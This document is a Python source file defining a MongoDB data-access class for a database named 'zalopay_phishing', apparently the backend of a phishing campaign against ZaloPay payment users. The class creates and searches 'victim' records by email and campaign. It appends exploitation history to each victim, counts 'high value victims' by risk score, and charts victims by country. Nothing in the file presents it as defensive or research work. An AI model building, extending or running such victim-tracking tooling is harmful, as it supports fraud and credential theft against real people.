"""
Victims Model
Database operations for victims collection
"""

import logging
from datetime import datetime, timezone, timedelta
from typing import Dict, List, Optional, Any
from pymongo import MongoClient
from pymongo.errors import PyMongoError

logger = logging.getLogger(__name__)

class VictimModel:
    """Victims database operations"""

    def __init__(self, mongodb_client: Optional[MongoClient] = None):
        self.client = mongodb_client
        self.db = None
        self.collection = None

    async def connect(self, database_name: str = "zalopay_phishing"):
        """Connect to MongoDB"""
        try:
            if self.client:
                self.db = self.client[database_name]
                self.collection = self.db.victims
                logger.info("Connected to victims collection")
                return True
            return False
        except PyMongoError as e:
            logger.error(f"MongoDB connection error: {e}")
            return False

    async def create_victim(self, victim_data: Dict[str, Any]) -> Optional[str]:
        """Create a new victim"""
        try:
            if not self.collection:
                await self.connect()

            # Add metadata
            victim_data["created_at"] = datetime.now(timezone.utc)
            victim_data["updated_at"] = datetime.now(timezone.utc)
            
            # Insert document
            result = self.collection.insert_one(victim_data)
            
            if result.inserted_id:
                logger.info(f"Victim created: {result.inserted_id}")
                return str(result.inserted_id)
            else:
                logger.error("Failed to create victim")
                return None

        except PyMongoError as e:
            logger.error(f"Error creating victim: {e}")
            return None

    async def get_victim_by_id(self, victim_id: str) -> Optional[Dict[str, Any]]:
        """Get victim by ID"""
        try:
            if not self.collection:
                await self.connect()

            victim = self.collection.find_one({"victim_id": victim_id})
            
            if victim:
                victim["_id"] = str(victim["_id"])
                return victim
            
            return None

        except PyMongoError as e:
            logger.error(f"Error getting victim by ID: {e}")
            return None

    async def get_victim_by_email(self, email: str) -> Optional[Dict[str, Any]]:
        """Get victim by email"""
        try:
            if not self.collection:
                await self.connect()

            victim = self.collection.find_one({"email": email})
            
            if victim:
                victim["_id"] = str(victim["_id"])
                return victim
            
            return None

        except PyMongoError as e:
            logger.error(f"Error getting victim by email: {e}")
            return None

    async def get_victims_paginated(self, page: int, limit: int, sort_by: str, 
                                  sort_order: str, filters: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Get paginated victims"""
        try:
            if not self.collection:
                await self.connect()

            # Calculate sort direction
            sort_direction = -1 if sort_order == "desc" else 1
            sort_spec = [(sort_by, sort_direction)]

            # Calculate skip
            skip = (page - 1) * limit

            # Get victims
            victims = list(self.collection.find(
                filters,
                sort=sort_spec,
                skip=skip,
                limit=limit
            ))

            # Convert ObjectId to string
            for victim in victims:
                victim["_id"] = str(victim["_id"])

            return victims

        except PyMongoError as e:
            logger.error(f"Error getting paginated victims: {e}")
            return []

    async def update_victim(self, victim_id: str, update_data: Dict[str, Any]) -> bool:
        """Update victim"""
        try:
            if not self.collection:
                await self.connect()

            update_data["updated_at"] = datetime.now(timezone.utc)

            result = self.collection.update_one(
                {"victim_id": victim_id},
                {"$set": update_data}
            )

            if result.modified_count > 0:
                logger.info(f"Victim updated: {victim_id}")
                return True
            else:
                logger.warning(f"No victim updated: {victim_id}")
                return False

        except PyMongoError as e:
            logger.error(f"Error updating victim: {e}")
            return False

    async def soft_delete_victim(self, victim_id: str) -> bool:
        """Soft delete victim"""
        try:
            if not self.collection:
                await self.connect()

            update_data = {
                "status": "deleted",
                "deleted_at": datetime.now(timezone.utc),
                "updated_at": datetime.now(timezone.utc)
            }

            result = self.collection.update_one(
                {"victim_id": victim_id},
                {"$set": update_data}
            )

            if result.modified_count > 0:
                logger.info(f"Victim soft deleted: {victim_id}")
                return True
            else:
                logger.warning(f"No victim soft deleted: {victim_id}")
                return False

        except PyMongoError as e:
            logger.error(f"Error soft deleting victim: {e}")
            return False

    async def add_exploitation_record(self, victim_id: str, exploitation_data: Dict[str, Any]) -> bool:
        """Add exploitation record to victim"""
        try:
            if not self.collection:
                await self.connect()

            # Add timestamp
            exploitation_data["timestamp"] = datetime.now(timezone.utc)

            result = self.collection.update_one(
                {"victim_id": victim_id},
                {
                    "$push": {"exploitation_history": exploitation_data},
                    "$set": {"updated_at": datetime.now(timezone.utc)}
                }
            )

            if result.modified_count > 0:
                logger.info(f"Exploitation record added to victim: {victim_id}")
                return True
            else:
                logger.warning(f"No exploitation record added to victim: {victim_id}")
                return False

        except PyMongoError as e:
            logger.error(f"Error adding exploitation record: {e}")
            return False

    async def search_victims(self, query: str, search_fields: List[str], 
                           filters: Dict[str, Any], sort_by: str, sort_order: str,
                           page: int, limit: int) -> Dict[str, Any]:
        """Search victims with text search"""
        try:
            if not self.collection:
                await self.connect()

            # Build search query
            search_query = {"$text": {"$search": query}} if query else {}
            
            # Combine with filters
            if filters:
                search_query.update(filters)

            # Calculate sort direction
            sort_direction = -1 if sort_order == "desc" else 1
            sort_spec = [(sort_by, sort_direction)]

            # Calculate skip
            skip = (page - 1) * limit

            # Get victims
            victims = list(self.collection.find(
                search_query,
                sort=sort_spec,
                skip=skip,
                limit=limit
            ))

            # Convert ObjectId to string
            for victim in victims:
                victim["_id"] = str(victim["_id"])

            # Get total count
            total_count = self.collection.count_documents(search_query)

            return {
                "victims": victims,
                "pagination": {
                    "page": page,
                    "limit": limit,
                    "total": total_count,
                    "pages": (total_count + limit - 1) // limit
                }
            }

        except PyMongoError as e:
            logger.error(f"Error searching victims: {e}")
            return {"victims": [], "pagination": {"page": page, "limit": limit, "total": 0, "pages": 0}}

    async def get_victims_with_filters(self, filters: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Get victims with filters"""
        try:
            if not self.collection:
                await self.connect()

            victims = list(self.collection.find(filters))

            # Convert ObjectId to string
            for victim in victims:
                victim["_id"] = str(victim["_id"])

            return victims

        except PyMongoError as e:
            logger.error(f"Error getting victims with filters: {e}")
            return []

    async def get_victims_by_campaign_id(self, campaign_id: str) -> List[Dict[str, Any]]:
        """Get victims by campaign ID"""
        return await self.get_victims_with_filters({"campaign_id": campaign_id})

    async def count_victims(self, filters: Dict[str, Any] = None) -> int:
        """Count victims"""
        try:
            if not self.collection:
                await self.connect()

            count = self.collection.count_documents(filters or {})
            return count

        except PyMongoError as e:
            logger.error(f"Error counting victims: {e}")
            return 0

    async def count_total_victims(self) -> int:
        """Count total victims"""
        return await self.count_victims()

    async def count_active_victims(self) -> int:
        """Count active victims"""
        return await self.count_victims({"status": "active"})

    async def count_high_value_victims(self) -> int:
        """Count high value victims"""
        return await self.count_victims({"risk_score": {"$gte": 80}})

    async def count_verified_victims(self) -> int:
        """Count verified victims"""
        return await self.count_victims({"verification_status": "verified"})

    async def count_victims_since(self, days: int) -> int:
        """Count victims created since N days ago"""
        start_time = datetime.now(timezone.utc) - timedelta(days=days)
        return await self.count_victims({"created_at": {"$gte": start_time}})

    async def count_high_value_victims_since(self, start_time: datetime) -> int:
        """Count high value victims since start_time"""
        return await self.count_victims({
            "risk_score": {"$gte": 80},
            "created_at": {"$gte": start_time}
        })

    async def get_geographic_distribution(self) -> Dict[str, int]:
        """Get geographic distribution of victims"""
        try:
            if not self.collection:
                await self.connect()

            pipeline = [
                {
                    "$group": {
                        "_id": "$location.country",
                        "count": {"$sum": 1}
                    }
                },
                {"$sort": {"count": -1}}
            ]

            result = list(self.collection.aggregate(pipeline))
            return {item["_id"] or "Unknown": item["count"] for item in result}

        except PyMongoError as e:
            logger.error(f"Error getting geographic distribution: {e}")
            return {}

    async def get_risk_distribution(self) -> Dict[str, int]:
        """Get risk level distribution of victims"""
        try:
            if not self.collection:
                await self.connect()

            pipeline = [
                {
                    "$group": {
                        "_id": "$risk_assessment.overall_risk_level",
                        "count": {"$sum": 1}
                    }
                },
                {"$sort": {"count": -1}}
            ]

            result = list(self.collection.aggregate(pipeline))
            return {item["_id"] or "unknown": item["count"] for item in result}

        except PyMongoError as e:
            logger.error(f"Error getting risk distribution: {e}")
            return {}

    async def health_check(self) -> bool:
        """Health check for victims collection"""
        try:
            if not self.collection:
                await self.connect()

            # Test basic operations
            self.collection.find_one()
            return True

        except PyMongoError as e:
            logger.error(f"Victims health check failed: {e}")
            return False